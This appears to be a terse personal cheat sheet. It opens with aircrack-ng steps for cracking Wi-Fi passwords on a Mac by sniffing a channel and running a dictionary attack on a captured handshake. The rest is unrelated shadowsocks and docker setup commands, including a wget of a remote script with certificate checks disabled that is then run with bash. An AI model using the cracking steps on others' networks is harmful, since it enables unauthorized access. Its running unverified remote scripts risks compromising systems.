# mac 下破解Wi-Fi
* 安装`aircrack-ng` 
* 创建airport连接
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
* `/airport -s` scan wifi
* `airport card sniff 信道`
* 破解 aircrack-ng -w password.txt -b c8:3a:35:30:3e:c8 /tmp/*.cap

sudo curl -L https://github.com/docker/compose/releases/download/1.17.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose

go get github.com/shadowsocks/shadowsocks-go/cmd/shadowsocks-server


docker run --name mu --net=host shadowsocks-mu 

docker run --name ssmgr3 -it -v ~/.ssmgr:/root/.ssmgr --net=host liukangxu/ssmgr 

docker run --name ssmgr0 -idt -v ~/.ssmgr:/root/.ssmgr --net=host gyteng/ssmgr ssmgr -c ~/.ssmgr/webgui.yml

yum install screen wget -y &&screen -S ss 
wget -N --no-check-certificate https://raw.githubusercontent.com/mmmwhy/ss-panel-and-ss-py-mu/master/ss-panel-v3-mod.sh && chmod +x ss-panel-v3-mod.sh && bash ss-panel-v3-mod.sh